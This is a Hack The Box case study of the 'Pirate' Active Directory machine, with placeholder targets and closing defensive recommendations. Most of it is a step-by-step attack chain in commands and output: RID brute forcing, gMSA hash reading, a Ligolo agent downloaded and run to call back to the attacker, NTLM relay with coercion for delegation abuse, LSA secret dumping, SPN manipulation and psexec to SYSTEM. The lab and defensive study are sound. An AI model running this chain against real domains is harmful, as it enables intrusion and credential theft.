---
title: "Pirate: AD Chain from Time Skew to Domain Controller Compromise"
description: "Kerberos clock-skew alignment, gMSA enumeration, and an NTLM relay pivot lead through delegation abuse to domain controller compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - kerberos
  - gmsa
  - rbcd
  - ntlm-relay
  - ligolo
---

## Summary

Pirate is a Hack The Box Hard Active Directory lab starting with supplied domain credentials. LDAP enumeration is initially blocked by Kerberos clock skew. After time alignment, `pre2k` and gMSA enumeration expose machine and service-account material leading to a WinRM foothold on the domain controller. An internal network segment contains a web host. A Ligolo pivot plus NTLM relay grants delegation rights, allowing administrator impersonation to recover additional credentials, followed by password resets and SPN abuse to compromise the domain controller. All target-specific identifiers, IPs, credentials, and hashes are replaced with placeholders throughout.

## Context and Objective

The lab presents a Windows domain controller running DNS, Kerberos, LDAP, WinRM, and IIS. Supplied credentials allow LDAP and SMB enumeration. The objective is to identify and chain trust relationships across the domain and an internal network segment to reach domain administrator access on the domain controller.

## Approach and Evidence

### Port Scanning

The initial scan identified the host as a domain controller.

```bash
rustscan -a <TARGET> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

```text
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec   Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp open  mc-nmf        .NET Message Framing
```

The hostname was added to the local hosts file for name resolution.

```bash
echo '<TARGET_IP> <DOMAIN_CONTROLLER_HOSTNAME> <TARGET_DOMAIN>' | sudo tee -a /etc/hosts
```

### SMB Enumeration and User Discovery

The supplied credentials validated over SMB but the exposed shares were minimal. RID brute forcing enumerated the domain user list.

```bash
nxc smb <TARGET_DOMAIN> -u '<INITIAL_USER>' -p '<SUPPLIED_PASSWORD>' --rid-brute \
  | awk '/SidTypeUser/' \
  | awk '{print $6}' \
  | awk -F'\\' '{print $2}' > users.txt
```

```text
Administrator
Guest
krbtgt
<DOMAIN_CONTROLLER_MACHINE_ACCOUNT>
<PRIVILEGED_USER>
<STANDARD_USER>
<INTERNAL_WEB_MACHINE_ACCOUNT>
```

Two domain user accounts were of interest for later stages.

### Kerberos Time Skew and pre2k Enumeration

LDAP enumeration of pre-created computer accounts initially failed with `KRB_AP_ERR_SKEW`. The recorded output shows clock skew errors for the target domain.

```bash
nxc ldap <TARGET_DOMAIN> -u '<INITIAL_USER>' -p '<SUPPLIED_PASSWORD>' -M pre2k
```

```text
[-] Error obtaining TGT for <PRECREATED_COMPUTER>@<TARGET_DOMAIN>: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Time synchronization resolved the issue:

```bash
sudo rdate -n <TARGET_DOMAIN>
```

```text
[+] Successfully obtained TGT for <PRECREATED_COMPUTER>@<TARGET_DOMAIN>
```

A dedicated Kerberos configuration file was used to scope authentication to the target domain. BloodHound collection and gMSA enumeration followed.

```bash
rusthound-ce -d '<TARGET_DOMAIN>' -f '<DOMAIN_CONTROLLER_HOSTNAME>' -i '<TARGET_IP>' -k -z
nxc ldap <TARGET_DOMAIN> --use-kcache --gmsa
```

```text
LDAP  <TARGET_DOMAIN>  389  <DOMAIN_CONTROLLER>  Account: <GMSA_ACCOUNT>  NTLM: <GMSA_NTLM_HASH>  PrincipalsAllowedToReadPassword: <AUTHORIZED_GROUP>
```

The gMSA account was selected as the initial foothold. Its NTLM hash was usable for authentication without knowing the plaintext password — a characteristic of Group Managed Service Accounts where the hash is distributed to authorized principals.

### WinRM Foothold as gMSA Account

The gMSA hash validated over WinRM:

```bash
nxc winrm <TARGET_DOMAIN> -u '<GMSA_ACCOUNT>' -H '<GMSA_NTLM_HASH>'
```

```text
WINRM  <TARGET_IP>  5985  <DOMAIN_CONTROLLER>  [+] <TARGET_DOMAIN>\<GMSA_ACCOUNT>:<GMSA_NTLM_HASH> (Pwn3d!)
```

An interactive shell was established. Local network discovery revealed an internal segment:

```powershell
ipconfig /all
arp -a
```

```text
Ethernet adapter vEthernet (Switch01):
   IPv4 Address. . . . . . . . . . . : <TARGET_IP>(Preferred)

<INTERNAL_HOST_IP>     00-15-5d-0b-d0-02     dynamic
```

The host at `<INTERNAL_HOST_IP>` was identified as an internal web host, accessible only from within the lab network.

### Ligolo Pivot to Internal Segment

A Ligolo tunnel was established to reach the internal network. The proxy was started on the attacker machine, and the agent was deployed on the domain controller.

```bash
~/Tools/Ligolo-ng/proxy --selfcert
```

```powershell
curl -o agent.exe <REMOTE_BINARY>
./agent.exe --connect [attacker]:11601 --ignore-cert
```

```text
INFO[0100] Starting tunnel to <TARGET_DOMAIN>\<GMSA_ACCOUNT>@<DOMAIN_CONTROLLER>
```

Reachability to the internal host was confirmed:

```bash
ping <INTERNAL_HOST_IP>
```

```text
64 bytes from <INTERNAL_HOST_IP>: icmp_seq=1 ttl=64 time=232 ms
```

### RBCD Delegation Abuse on Internal Web Host

The attack used NTLM relay to grant Resource-Based Constrained Delegation rights. Coerced authentication from the internal web host was relayed to LDAPS, modifying its delegation attribute to allow a controlled computer account to impersonate users via S4U2Proxy.

```bash
impacket-ntlmrelayx -t ldaps://<TARGET> \
  --delegate-access \
  --escalate-user '<CONTROLLED_COMPUTER_ACCOUNT>' \
  -smb2support \
  --remove-mic

coercer coerce -u '<GMSA_ACCOUNT>' --hashes ':<GMSA_NTLM_HASH>' \
  -d <TARGET_DOMAIN> -l <ATTACKER_IP> -t <INTERNAL_HOST_IP> --always-continue
```

```text
[*] ldaps://<TARGET_DOMAIN>/<INTERNAL_WEB_MACHINE_ACCOUNT>@<TARGET_IP> [1] -> Delegation rights modified successfully!
[*] ldaps://<TARGET_DOMAIN>/<INTERNAL_WEB_MACHINE_ACCOUNT>@<TARGET_IP> [1] -> <CONTROLLED_COMPUTER_ACCOUNT> can now impersonate users via S4U2Proxy
```

With delegation rights granted, a service ticket was requested impersonating an administrator for the `CIFS` service on the internal web host:

```bash
impacket-getST <TARGET_DOMAIN>/'<CONTROLLED_COMPUTER_ACCOUNT>' \
  -spn 'cifs/<INTERNAL_WEB_HOSTNAME>' \
  -impersonate <ADMINISTRATOR_ACCOUNT> \
  -dc-ip <TARGET_IP> \
  -k -no-pass
```

```text
[*] Impersonating <ADMINISTRATOR_ACCOUNT>
[*] Saving ticket in <ADMINISTRATOR_ACCOUNT>@cifs_<INTERNAL_WEB_HOSTNAME>@<TARGET_DOMAIN>.ccache
```

The ticket was used to dump local secrets from the internal web host:

```bash
export KRB5CCNAME=<ADMINISTRATOR_ACCOUNT>@cifs_<INTERNAL_WEB_HOSTNAME>@<TARGET_DOMAIN>.ccache
impacket-secretsdump -k -no-pass -target-ip <INTERNAL_HOST_IP> <INTERNAL_WEB_HOSTNAME>
```

The LSA secrets dump revealed a reusable local password for a domain account:

```text
[*] Dumping LSA Secrets
[*] DefaultPassword
<TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD>
```

Credential validation:

```bash
nxc smb <INTERNAL_HOST_IP> -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>'
```

```text
SMB  <INTERNAL_HOST_IP>  445  <INTERNAL_WEB_HOSTNAME>  [+] <TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD>
```

### Password Reset and SPN Abuse for Domain Controller Compromise

The standard user account had permission to reset a privileged account. A password reset was performed:

```bash
bloodyAD --host '<TARGET_IP>' -d <TARGET_DOMAIN> \
  -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>' \
  set password '<PRIVILEGED_USER>' '<RESET_PASSWORD>'
```

```text
[+] Password changed successfully!
```

An SPN was added to the domain controller machine account to impersonate the HTTP service on the internal web host, then a service ticket was requested using the `altservice` flag to pivot the ticket to CIFS on the domain controller:

```bash
python3 addspn.py -u '<TARGET_DOMAIN>\<PRIVILEGED_USER>' -p '<RESET_PASSWORD>' \
  -t '<DOMAIN_CONTROLLER_MACHINE_ACCOUNT>' -s 'HTTP/<INTERNAL_WEB_HOSTNAME>' <TARGET_IP>

impacket-getST -spn 'HTTP/<INTERNAL_WEB_HOSTNAME>' \
  -impersonate '<ADMINISTRATOR_ACCOUNT>' \
  <TARGET_DOMAIN>/<PRIVILEGED_USER>:'<RESET_PASSWORD>' \
  -dc-ip <TARGET_IP> \
  -altservice 'CIFS/<DOMAIN_CONTROLLER_HOSTNAME>'
```

```text
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/<INTERNAL_WEB_HOSTNAME>@<TARGET_DOMAIN> to CIFS/<DOMAIN_CONTROLLER_HOSTNAME>@<TARGET_DOMAIN>
[*] Saving ticket in <ADMINISTRATOR_ACCOUNT>@CIFS_<DOMAIN_CONTROLLER_HOSTNAME>@<TARGET_DOMAIN>.ccache
```

The final ticket was used to obtain a SYSTEM shell on the domain controller:

```bash
export KRB5CCNAME=<ADMINISTRATOR_ACCOUNT>@CIFS_<DOMAIN_CONTROLLER_HOSTNAME>@<TARGET_DOMAIN>.ccache
impacket-psexec -k -no-pass <DOMAIN_CONTROLLER_HOSTNAME>
```

The shell landed as `<SYSTEM_ACCOUNT>` on the domain controller. The `<PRIVILEGED_RESULT>` was recovered.

## Challenges and Decisions

- **Kerberos clock skew** blocked initial `pre2k` enumeration. The fix was time synchronization with `rdate`, after which TGT acquisition succeeded. This is a common operational issue in lab environments where the attacker machine clock drifts.
- **Internal network isolation**: The internal web host was only reachable through the domain controller's internal adapter. A Ligolo tunnel was necessary before any direct interaction.
- **Credential discovery from LSA secrets**: A password stored in the internal web host's `DefaultPassword` provided cross-service credential material, enabling the final privilege escalation chain.

## Outcome

The notes establish a documented path from supplied domain credentials through time-skew resolution, gMSA exploitation, internal pivoting, RBCD delegation abuse, credential recovery, SPN manipulation, and finally domain administrator access. All outcomes are reported by the source; specific target IPs, credentials, and hashes are excluded.

## Lessons and Recommendations

- Keep Kerberos time synchronized and monitor for `KRB_AP_ERR_SKEW`, because time drift disrupts account enumeration and Kerberos authentication.
- Restrict which principals can read gMSA passwords and audit `PrincipalsAllowedToReadPassword` regularly. Any account that can read a gMSA password effectively becomes a service account with broad trust.
- Remove or tightly limit NTLM relay opportunities on internal LDAP/LDAPS services. LDAP signing and channel binding reduce coercion-based attack impact.
- Treat machine account SPN write access as a critical privilege. SPN manipulation can turn into constrained delegation and service-ticket abuse.
- Avoid storing reusable plaintext passwords in machine secrets or local configuration. The `DefaultPassword` recovered from the internal web host was sufficient to continue the attack chain.

## References

- Hack The Box, [Pirate](https://app.hackthebox.com/machines/Pirate) machine.
